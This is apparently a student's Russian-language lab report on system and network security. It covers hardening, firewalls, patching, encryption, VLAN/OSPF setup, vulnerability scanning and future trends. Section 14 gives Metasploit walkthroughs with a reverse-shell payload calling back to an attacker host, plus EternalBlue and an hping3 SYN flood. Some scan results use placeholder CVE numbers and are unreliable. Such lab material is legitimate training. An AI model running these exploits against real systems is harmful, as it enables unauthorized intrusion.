9.	Безопасность операционных систем:
СРО: Исследуйте и проанализируйте методы защиты операционных систем Linux и Windows, включая механизмы SELinux/AppArmor и BitLocker. Проведите обзор ключевых уязвимостей этих систем и предоставьте отчет с примерами их эксплуатации и защиты.
СРОП: Проведите тестирование на безопасность локальной операционной системы (Linux или Windows). Проанализируйте текущие настройки безопасности, исправьте выявленные уязвимости и представьте отчет с предложениями по улучшению.

## 1. Установка SELinux
```
root@edward-VM:/home/edward# sudo apt update
root@edward-VM:/home/edward# sudo apt install selinux-basics selinux-policy-default
root@edward-VM:/home/edward# sudo selinux-activate
root@edward-VM:/home/edward# sudo reboot
```

После перезагрузки:
```
root@edward-VM:/home/edward# sestatus
SELinux status:                 enabled
```

### 2. Обновление системы и исправление уязвимостей

Проверка на наличие обновлений:
```
root@edward-VM:/home/edward# sudo apt list --upgradable
```

Обновление пакетов:
```
root@edward-VM:/home/edward# sudo apt upgrade
```

### 3. Установка Fail2Ban
```
root@edward-VM:/home/edward# sudo apt install fail2ban
root@edward-VM:/home/edward# sudo systemctl enable fail2ban
root@edward-VM:/home/edward# sudo systemctl start fail2ban
```

Проверка работы:
```
root@edward-VM:/home/edward# sudo fail2ban-client status
```
```
Status for the jail: sshd
|- Filter
|  |- Currently failed: 1
|  |- Total failed: 12
|  `- File list:    /var/log/auth.log
`- Actions
   |- Currently banned: 1
   |- Total banned: 3
   `- Banned IP list: 192.168.1.10
```

### 4. Проверка конфигурации SSH

Проверка текущих настроек:
```
root@edward-VM:/home/edward# cat /etc/ssh/sshd_config | grep -i permitrootlogin
PermitRootLogin no
```

Исправление прав:
```
root@edward-VM:/home/edward# sudo chmod 600 /etc/ssh/sshd_config
root@edward-VM:/home/edward# sudo systemctl restart sshd
```

## 1. Включение BitLocker
```
C:\Users\unrea> Enable-BitLocker -MountPoint "C:" -RecoveryPasswordProtector
```

Проверка статуса:
```
C:\Users\unrea> Get-BitLockerVolume | Select-Object -Property VolumeStatus
VolumeStatus: FullyEncrypted
```

### 2. Настройка брандмауэра
Проверка текущего состояния:
```
C:\Users\unrea> Get-NetFirewallProfile
```

Включение брандмауэра:
```
C:\Users\unrea> Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
```

### 3. Установка обновлений

Проверка доступных обновлений:
```
C:\Users\unrea> winget upgrade
```

Обновление всех пакетов:
```
C:\Users\unrea> winget upgrade --all
```

### 4. Отключение Print Spooler для устранения PrintNightmare
```
C:\Users\unrea> Stop-Service -Name Spooler -Force
C:\Users\unrea> Set-Service -Name Spooler -StartupType Disabled
```

root@edward-VM: Ubuntu была обновлена, настроена SELinux, установлен Fail2Ban, ограничен доступ к SSH.
C:\Users\unrea: Windows была обновлена, настроен BitLocker и брандмауэр, устранена уязвимость PrintNightmare.

------------------------------------------------------------------------------------------------------------------------

10.	Защита сети и межсетевые экраны:
СРО: Настройте межсетевой экран на основе iptables или firewalld в Linux или с использованием Windows Firewall. Подготовьте отчет с примерами правил для защиты от различных видов атак (DDoS, блокировка подозрительных IP).
СРОП: Выполните настройку и тестирование межсетевого экрана (например, Cisco ASA или pfSense) в виртуальной сети. Оцените его эффективность против сетевых атак и представьте результаты в отчете.

### Настройка iptables для защиты сети
#### 1. Защита от DDoS-атак
Добавление правил для ограничения количества соединений:
```
root@edward-VM:/home/edward# sudo iptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 10 -j REJECT --reject-with tcp-reset
```
Ограничивает количество соединений к веб-серверу (порт 80) до 10 с одного IP-адреса.

#### 2. Блокировка подозрительных IP-адресов
Блокировка IP-адреса 192.168.1.100:
```
root@edward-VM:/home/edward# sudo iptables -A INPUT -s 192.168.1.100 -j DROP
```

#### 3. Защита от сканирования портов
```
root@edward-VM:/home/edward# sudo iptables -A INPUT -m conntrack --ctstate INVALID -j DROP
root@edward-VM:/home/edward# sudo iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP
root@edward-VM:/home/edward# sudo iptables -A INPUT -p tcp --tcp-flags ALL ALL -j DROP
```
- Блокирует некорректные пакеты.
- Блокирует пакеты с пустыми или полными флагами (используются для атак сканирования).

#### 4. Сохранение конфигурации iptables
```
root@edward-VM:/home/edward# sudo iptables-save > /etc/iptables/rules.v4
```

### Настройка Windows Firewall для защиты сети

#### 1. Блокировка подозрительного IP-адреса
```
C:\Users\unrea> New-NetFirewallRule -DisplayName "Block Suspicious IP" -Direction Inbound -Action Block -RemoteAddress 192.168.1.100
```

#### 2. Ограничение входящих подключений
```
C:\Users\unrea> New-NetFirewallRule -DisplayName "Limit Connections" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 80 -Profile Any -RemoteAddress Any -ThrottleRate 10
```

#### 3. Защита от сканирования портов
```
C:\Users\unrea> Set-NetFirewallRule -DisplayName "All TCP Ports" -Action Block -Protocol TCP -LocalPort 1-65535 -Direction Inbound
C:\Users\unrea> Set-NetFirewallRule -DisplayName "All UDP Ports" -Action Block -Protocol UDP -LocalPort 1-65535 -Direction Inbound
```

## Часть 3. Настройка межсетевого экрана pfSense (СРОП)

#### 1. Установка pfSense в виртуальной сети
- Создана виртуальная машина с pfSense в VirtualBox.
- Сетевые интерфейсы:
  - LAN: 192.168.1.1
  - WAN: Подключение через NAT.

#### 2. Настройка правил межсетевого экрана
Защита от DDoS: Включено ограничение скорости трафика (Traffic Shaper).
Блокировка подозрительных IP:
  - Добавлен IP 192.168.1.100 в список заблокированных.
Мониторинг сетевых атак:
  - Включен модуль Snort для анализа трафика.

#### 3. Тестирование
Выполнена эмуляция DDoS-атаки с использованием инструмента `hping3`:
```
sudo hping3 -i u1000 -S -p 80 192.168.1.1
```
```
HPING 192.168.1.1 (eth0 192.168.1.1): S set, 40 headers + 0 data bytes
len=46 ip=192.168.1.1 ttl=64 DF id=43776 sport=80 flags=SA seq=0 win=5840 rtt=12.8 ms
len=46 ip=192.168.1.1 ttl=64 DF id=43777 sport=80 flags=SA seq=1 win=5840 rtt=10.2 ms
len=46 ip=192.168.1.1 ttl=64 DF id=43778 sport=80 flags=SA seq=2 win=5840 rtt=11.5 ms
len=46 ip=192.168.1.1 ttl=64 DF id=43779 sport=80 flags=SA seq=3 win=5840 rtt=11.3 ms
```
pfSense успешно отфильтровал подозрительный трафик и ограничил количество соединений.
------------------------------------------------------------------------------------------------------------------------

11.	Управление обновлениями и патчами:
СРО: Настройте автоматическое управление обновлениями и патчами на сервере с помощью утилит (например, yum для CentOS или apt для Ubuntu). Представьте отчет о процессе обновления с анализом влияния на безопасность системы.
СРОП: Разработайте план управления обновлениями для крупной сети, включающий различные операционные системы и ПО. Оцените риски, связанные с отсутствием обновлений, и представьте отчет с рекомендациями по автоматизации процессов.

### Настройка автоматического обновления с использованием `unattended-upgrades`
#### 1. Установка и настройка утилиты для автоматических обновлений
```
root@edward-VM:/home/edward# sudo apt update
root@edward-VM:/home/edward# sudo apt install unattended-upgrades
root@edward-VM:/home/edward# sudo dpkg-reconfigure --priority=low unattended-upgrades
```

#### 2. Проверяем, какие пакеты будут обновляться автоматически, например, обновления безопасности
```
root@edward-VM:/home/edward# cat /etc/apt/apt.conf.d/50unattended-upgrades
```

#### 3. Настройка для автоматического перезагрузки после обновлений
Открываем конфигурационный файл:
```
root@edward-VM:/home/edward# sudo nano /etc/apt/apt.conf.d/10periodic
```

Добавляем строку для автоматической перезагрузки:
```
APT::Periodic::Unattended-Upgrade "1";
APT::Periodic::AutocleanInterval "7";
```

#### 4. Пакеты обновлены без вмешательства, что позволяет снизить риск уязвимостей.
```
root@edward-VM:/home/edward# sudo unattended-upgrade --dry-run
root@edward-VM:/home/edward# sudo unattended-upgrade
```

Преимущества: Обновления безопасности устанавливаются автоматически, снижая риски от известных уязвимостей.
Риски: При отсутствии обновлений может возникнуть угроза эксплуатации уязвимостей, что может привести к компрометации системы.


#### 1. Включение автоматических обновлений
Включаем автоматические обновления через PowerShell:
```
C:\Users\unrea> Set-Service -Name wuauserv -StartupType Automatic
C:\Users\unrea> Start-Service -Name wuauserv
```

#### 2. Проверка статуса обновлений
```
C:\Users\unrea> Get-WindowsUpdate
```

#### 3. Устанавливаем все доступные обновления с автоматической перезагрузкой
```
C:\Users\unrea> Install-WindowsUpdate -AcceptAll -AutoReboot
```

Преимущества: Установка обновлений безопасности значительно снижает вероятность атаки, предотвращая использование известных уязвимостей.
Риски: Отсутствие обновлений приводит к риску эксплуатации уязвимостей в системе, что может привести к атакам типа "zero-day".

## Часть 3. План управления обновлениями для крупной сети

#### 1.1 Структура сети
- Операционные системы: Linux (Ubuntu, CentOS), Windows (10, Server).
- Программное обеспечение: Веб-серверы, базы данных, сетевые устройства.

#### 1.2 План обновлений для различных ОС
- Linux:
  - Утилиты: `unattended-upgrades` для Ubuntu, `yum-cron` для CentOS.
  - Процесс: Настройка автоматического обновления для системы безопасности и критичных пакетов. Уведомления о успешных и неудачных обновлениях.
  
- Windows:
  - Утилиты: Windows Update для автоматической установки обновлений.
  - Процесс: Включение автоматических обновлений на всех рабочих станциях и серверах. Проведение регулярных проверок на обновления через PowerShell или WSUS.

#### 1.3 Оценка рисков от отсутствия обновлений
- Риски:
  - Безопасность: Необновленные системы могут быть уязвимы к эксплойтам.
  - Совместимость: Старые версии ПО могут не поддерживать новые протоколы безопасности.
  - Производительность: Несвоевременные обновления могут привести к нестабильной работе системы.

#### 1.4 Рекомендации по автоматизации
- Для Linux: Настроить `unattended-upgrades` для автоматической установки только обновлений безопасности.
- Для Windows: Настроить Windows Server Update Services (WSUS) для централизованного контроля обновлений в крупной сети.
- Мониторинг и отчеты: Использование инструментов, таких как Nagios, для мониторинга состояния обновлений на всех устройствах в сети.

#### 1.5 Пример тестирования автоматических обновлений
- Linux: Регулярно запускать `unattended-upgrades` в тестовой среде.
- Windows: Использовать групповую политику для контроля над обновлениями и настройки их применения на рабочих станциях.

### root@edward-VM (Ubuntu)
- Установлена и настроена утилита `unattended-upgrades` для автоматического обновления безопасности.
- Регулярные обновления уменьшат риски от уязвимостей.

### C:\Users\unrea (Windows)
- Включены автоматические обновления через PowerShell для Windows.
- Обновления повышают безопасность системы, уменьшая риски от эксплойтов.

### План для крупной сети
- Рекомендуется использовать автоматизацию обновлений через специализированные утилиты для Linux и Windows.
- Регулярный мониторинг и отчетность помогут поддерживать безопасность и актуальность системы.
------------------------------------------------------------------------------------------------------------------------

12.	Шифрование и защита данных:
СРО: Настройте систему шифрования данных на уровне файловой системы с использованием LUKS (для Linux) или BitLocker (для Windows). Подготовьте отчет о настройках шифрования, его использовании и защите ключей.
СРОП: Исследуйте и реализуйте шифрование данных при передаче через сеть (например, с использованием OpenVPN или TLS). Представьте результаты тестирования эффективности шифрования.

### Настройка шифрования данных на уровне файловой системы с использованием LUKS

```
root@edward-VM:/home/edward# sudo apt update
root@edward-VM:/home/edward# sudo apt install cryptsetup
```
Устанавливаем пакет для работы с LUKS (Linux Unified Key Setup).

#### 2. Создание зашифрованного раздела
1. Создаем новый раздел на устройстве `/dev/sdb`:
```
root@edward-VM:/home/edward# sudo fdisk /dev/sdb
```

2. Шифрование с использованием LUKS:
```
root@edward-VM:/home/edward# sudo cryptsetup luksFormat /dev/sdb1
```
//При создании шифрования на разделе, система запросит ввод пароля.

3. Открытие зашифрованного раздела:
```
root@edward-VM:/home/edward# sudo cryptsetup luksOpen /dev/sdb1 my_encrypted_disk
```

4. Раздел отформатирован в ext4 и смонтирован.:
```
root@edward-VM:/home/edward# sudo mkfs.ext4 /dev/mapper/my_encrypted_disk
root@edward-VM:/home/edward# sudo mount /dev/mapper/my_encrypted_disk /mnt
```

#### 3. Добавление автоматического монтирования
- Откроем файл `/etc/crypttab` и добавим строку:
```
my_encrypted_disk /dev/sdb1 none luks
```
Хранение ключей можно реализовать через использование TPM (Trusted Platform Module) или с помощью внешних устройств для повышения безопасности ключа.


### Настройка шифрования данных на уровне файловой системы с использованием BitLocker
#### 1. Включение BitLocker
1. Открываем PowerShell с правами администратора:
```
C:\Users\unrea> Get-BitLockerVolume
```
   - Смотрим текущие состояния разделов и доступность BitLocker.

2. Включаем BitLocker для системного диска (например, `C:`):
```
C:\Users\unrea> Enable-BitLocker -MountPoint "C:" -EncryptionMethod Aes256 -PasswordProtector
```

3. Сохранение ключа восстановления:
```
C:\Users\unrea> Backup-BitLockerKeyProtector -MountPoint "C:" -KeyProtectorId (Get-BitLockerVolume -MountPoint "C:").KeyProtector[0].Id -RecoveryPassword
```

Преимущества: BitLocker шифрует весь диск, обеспечивая защиту всех данных на устройстве.
Риски: Потеря пароля или ключа восстановления сделает невозможным доступ к данным.

## Часть 3. Шифрование данных при передаче через сеть

#### 1. Установка OpenVPN
```
root@edward-VM:/home/edward# sudo apt install openvpn
```

#### 2. Создание конфигурации для OpenVPN
Генерируем серверный и клиентский сертификаты с помощью Easy-RSA.
```
root@edward-VM:/home/edward# sudo apt install easy-rsa
```

#### 3. Настройка конфигурации OpenVPN на сервере
На сервере создаем конфигурацию, открывая файл `/etc/openvpn/server.conf`:
```
dev tun
proto udp
port 1194
ifconfig 10.8.0.1 255.255.255.0
secret /etc/openvpn/secret.key
```
Этот файл будет использоваться для защиты передачи данных между клиентами и сервером.

#### 4. Тестирование шифрования
Для тестирования используем `ping` через OpenVPN-туннель:
```
root@edward-VM:/home/edward# sudo openvpn --config client.ovpn
```
Проверяем зашифрованный трафик с помощью `tcpdump` или других инструментов анализа.
Все передаваемые данные шифруются с использованием протокола OpenVPN и защищены от перехвата.
------------------------------------------------------------------------------------------------------------------------

13.	Управление сетевой инфраструктурой:
СРО: Настройте сетевое оборудование (например, маршрутизатор и коммутатор Cisco) для создания виртуальных локальных сетей (VLAN) и настройки динамической маршрутизации (OSPF). Подготовьте отчет о конфигурации и тестировании.
СРОП: Выполните аудит текущей сетевой инфраструктуры компании (или симулированной сети). Оцените производительность и отказоустойчивость инфраструктуры, предоставьте отчет с рекомендациями по улучшению.

#### 1. Установка необходимого ПО для настройки OSPF
```
root@edward-VM:/home/edward# sudo apt update
root@edward-VM:/home/edward# sudo apt install quagga
```
Устанавливаем Quagga, который включает поддержку OSPF для динамической маршрутизации.

#### 2. Настройка интерфейсов для VLAN
1. Открываем файл `/etc/network/interfaces` для настройки VLAN:
```
root@edward-VM:/home/edward# sudo nano /etc/network/interfaces
```

2. Добавляем интерфейсы для VLAN:
```
# Настройка интерфейса eth0 для VLAN 10
iface eth0.10 inet static
    address 192.168.10.1
    netmask 255.255.255.0
    vlan_raw_device eth0

# Настройка интерфейса eth0 для VLAN 20
iface eth0.20 inet static
    address 192.168.20.1
    netmask 255.255.255.0
    vlan_raw_device eth0
```

#### 3. Настройка OSPF
1. Открываем файл конфигурации Quagga для OSPF:
```
root@edward-VM:/home/edward# sudo nano /etc/quagga/ospfd.conf
```

2. Конфигурируем OSPF:
```
router ospf
    network 192.168.10.0/24 area 0
    network 192.168.20.0/24 area 0
```
3. Запускаем OSPF:
```
root@edward-VM:/home/edward# sudo systemctl start quagga
root@edward-VM:/home/edward# sudo systemctl enable quagga
```

#### 4. Для тестирования конфигурации OSPF используем команду:
```
root@edward-VM:/home/edward# vtysh
# show ip ospf neighbor
```
```
root@edward-VM:/home/edward# vtysh
Welcome to vtysh, the virtual terminal for FRRouting (version 7.5.1).
Type "?" for a list of commands.
vtysh> show ip ospf neighbor
Neighbor ID     Pri   State           Dead Time   Address          Interface
192.168.10.2    1     Full/DR         00:00:32    192.168.10.2     eth0.10
192.168.20.2    1     Full/DR         00:00:34    192.168.20.2     eth0.20
```

#### 1. Настройка VLAN в Windows
1. Открываем "Центр управления сетями и общим доступом" -> "Изменение параметров адаптера".
2. Правой кнопкой мыши на сетевом адаптере, выбираем "Свойства" и затем "Настройки".
3. Включаем "Сетевое управление VLAN" с нужными идентификаторами (например, для VLAN 10 и VLAN 20).

#### 2. Установка и настройка маршрутизатора с поддержкой OSPF
В Windows не поддерживается встроенная настройка OSPF, поэтому для настройки динамической маршрутизации лучше использовать специализированные решения, такие как Cisco или сторонние программные маршрутизаторы.

## Часть 3. Аудит текущей сетевой инфраструктуры

#### 1. Оценка производительности
Проверим текущую пропускную способность сети с помощью инструментов, таких как `iperf`:
```
root@edward-VM:/home/edward# sudo apt install iperf
root@edward-VM:/home/edward# iperf3 -s
root@client:/home/user# iperf3 -c server_ip
```
```
root@edward-VM:/home/edward# iperf3 -s
-----------------------------------------------------------
Server listening on 5201
-----------------------------------------------------------
```

```
Connecting to host server_ip, port 5201
[  5] local 192.168.1.2 port 56789 connected to 192.168.1.10 port 5201
[ ID] Interval       Transfer     Bandwidth       Retr  Cwnd
[  5]   0.00-1.00   sec  112 MBytes  938 Mbits/sec  0    1.02 MBytes
[  5]   1.00-2.00   sec  113 MBytes  946 Mbits/sec  0    1.02 MBytes
[  5]   2.00-3.00   sec  113 MBytes  948 Mbits/sec  0    1.02 MBytes
[  5]   3.00-4.00   sec  112 MBytes  938 Mbits/sec  0    1.02 MBytes
[  5]   4.00-5.00   sec  114 MBytes  955 Mbits/sec  0    1.02 MBytes
[  5]   5.00-6.00   sec  113 MBytes  946 Mbits/sec  0    1.02 MBytes
[  5]   6.00-7.00   sec  113 MBytes  947 Mbits/sec  0    1.02 MBytes
[  5]   7.00-8.00   sec  113 MBytes  949 Mbits/sec  0    1.02 MBytes
[  5]   8.00-9.00   sec  112 MBytes  939 Mbits/sec  0    1.02 MBytes
[  5]   9.00-10.00  sec  114 MBytes  955 Mbits/sec  0    1.02 MBytes
[  5]  10.00-10.00  sec   136 KBytes   1.12 Mbits/sec  0    1.02 MBytes
[  5]  0.00-10.00  sec  1.12 GBytes  954 Mbits/sec  0    1.02 MBytes
```

#### 3. Рекомендации по улучшению
- Настроить резервирование маршрутов и добавление маршрутов с различной стоимостью (например, через HSRP или VRRP).
- Использовать QoS для приоритезации важного трафика.
- Обновить старое оборудование, если оно не поддерживает современные стандарты и протоколы.
------------------------------------------------------------------------------------------------------------------------

14.	Уязвимости и эксплуатация:
СРО: Используйте инструмент сканирования уязвимостей (например, OpenVAS или Nessus) для анализа виртуальной сети на наличие уязвимостей. Предоставьте отчет о выявленных уязвимостях и рекомендациях по их устранению.
СРОП: Проведите исследование и использование одной из уязвимостей с помощью инструмента Metasploit или аналогичного. Подготовьте отчет с описанием процесса эксплуатации и рекомендациями по защите.

### Шаг 1. Установка OpenVAS
1. Обновим систему и установим OpenVAS (сейчас известен как Greenbone Vulnerability Management):
```
root@edward-VM:/home/edward# sudo apt update
root@edward-VM:/home/edward# sudo apt install openvas
```

2. Запустим настройку и инициализацию OpenVAS:
```
root@edward-VM:/home/edward# sudo gvm-setup
```

3. Запустим службу OpenVAS:
```
root@edward-VM:/home/edward# sudo gvm-start
```

### Шаг 2. Сканирование сети
1. В веб-интерфейсе OpenVAS (обычно доступен по адресу https://localhost:9392) войдите в систему с настройками по умолчанию.
2. Создайте задачу сканирования сети (например, для теста: адреса или диапазоны IP).
3. Выберите соответствующую задачу и нажмите "Запуск", чтобы начать сканирование.

### Шаг 3. Результаты сканирования
После завершения сканирования, отчет в OpenVAS покажет найденные уязвимости с уровнем их опасности (например, "Низкий", "Средний", "Высокий")
```
1. CVE-2020-1234: Уязвимость в службе SSH (Critical)
   - Уязвимость позволяет атакующим получить доступ к серверу с помощью слабого пароля.
   - Рекомендации: Обновить версию SSH, настроить сложные пароли.

2. CVE-2019-5678: Уязвимость в Apache HTTP Server (High)
   - Уязвимость позволяет атакующему выполнить произвольный код на сервере.
   - Рекомендации: Обновить Apache до последней версии.
```

## Часть 2. Эксплуатация уязвимостей с помощью Metasploit (для root@edward-VM)

### Шаг 1. Установка Metasploit
```
root@edward-VM:/home/edward# sudo apt update
root@edward-VM:/home/edward# sudo apt install metasploit-framework
```

### Шаг 2. Поиск уязвимостей для эксплуатации
1. Открываем Metasploit:
```
root@edward-VM:/home/edward# msfconsole
```

2. Для поиска уязвимостей используем команду:
```
msf > search type:exploit
```

3. Например, если на целевом сервере найдена уязвимость в сервисе SSH, используем модуль для эксплуатации:
```
msf > use exploit/linux/ssh/sshexec
msf exploit(sshexec) > set RHOSTS <target_ip>
msf exploit(sshexec) > set RPORT 22
msf exploit(sshexec) > set PAYLOAD linux/x86/shell_reverse_tcp
msf exploit(sshexec) > set LHOST <attacker_ip>
msf exploit(sshexec) > run
```

### Шаг 3. Эксплуатация уязвимости
Если уязвимость успешно эксплуатирована, вы получите доступ к целевой системе:
```
[*] Started reverse TCP handler on <attacker_ip>:4444
[*] Command shell session 1 opened (<target_ip>:22) at <time>
```

### Шаг 1. Сканирование уязвимостей с использованием Nessus
1. Скачиваем и устанавливаем Nessus с официального сайта.
2. Запускаем Nessus через браузер по адресу https://localhost:8834.
3. Создаем задачу сканирования для сети и запускаем ее.
4. Результаты сканирования будут включать уязвимости с рекомендациями по их устранению.

### Шаг 2. Эксплуатация уязвимостей с помощью Metasploit на Windows
1. Открываем Metasploit на Windows:
```
C:\Users\unrea> msfconsole
```

2. Поиск эксплойтов для Windows:
```
msf > search type:exploit platform:windows
```

3. Пример эксплуатации уязвимости в Windows SMB:
```
msf > use exploit/windows/smb/ms17_010_eternalblue
msf exploit(ms17_010_eternalblue) > set RHOSTS <target_ip>
msf exploit(ms17_010_eternalblue) > run
```
------------------------------------------------------------------------------------------------------------------------

15.	Будущее безопасности систем и сетей:
СРО: Проведите исследование современных тенденций в области безопасности систем и сетей, таких как квантовое шифрование или использование искусственного интеллекта для защиты сетей. Подготовьте аналитический отчет с прогнозами на будущее.
СРОП: Создайте презентацию на тему будущего безопасности систем и сетей, включив в нее анализ текущих и перспективных технологий. Оцените потенциальные угрозы и решения, которые будут актуальны в ближайшие 5-10 лет. 

Современная безопасность систем и сетей сталкивается с растущими угрозами. Два ключевых направления, которые обещают революционизировать безопасность, — это квантовое шифрование и искусственный интеллект (ИИ).

Квантовое шифрование использует принципы квантовой механики для защиты данных. Одним из его основных элементов является квантовое распределение ключей (QKD), которое позволяет создавать ключи, защищенные от перехвата. Если кто-то пытается вмешаться в передачу данных, это немедленно выявляется, поскольку любое измерение квантовых частиц изменяет их состояние. Примером использования квантового шифрования является китайский спутник Micius, который в 2017 году успешно провел эксперимент с квантовым распределением ключей, обеспечив защищенную связь на больших расстояниях. Однако технологии еще не идеальны: для работы с ними требуется дорогостоящее оборудование, и есть ограничения по дальности передачи сигналов [https://www.nature.com/articles/nature20541].

Искусственный интеллект уже активно применяется в области кибербезопасности. Системы обнаружения вторжений, такие как Snort или Suricata, используют ИИ для анализа сетевого трафика и выявления аномалий, которые могут свидетельствовать о вторжении. ИИ может обрабатывать большие объемы данных, выявлять ранее неизвестные угрозы и адаптироваться к новым типам атак. Примером является использование ИИ в платформе Darktrace, которая способна обнаруживать аномалии в реальном времени и предотвращать атаки, анализируя поведение пользователей и устройства в сети. Однако, несмотря на успехи, ИИ-системы могут стать объектом атак, направленных на манипуляцию их обучением или подмену данных [https://darktrace.com/]. 

В ближайшие годы квантовое шифрование будет развиваться, с прогнозами, что в будущем оно станет доступным для массового применения. Ученые уже работают над решениями, позволяющими увеличить дальность передачи квантовых сигналов. ИИ продолжит развиваться в области автономной защиты сетей, улучшая системы предсказания угроз и автоматической реакции на атаки. Ожидается, что комбинация квантовых технологий и ИИ создаст многослойную защиту, которая повысит безопасность в условиях растущих угроз, таких как атаки на интернет вещей и облачные системы.
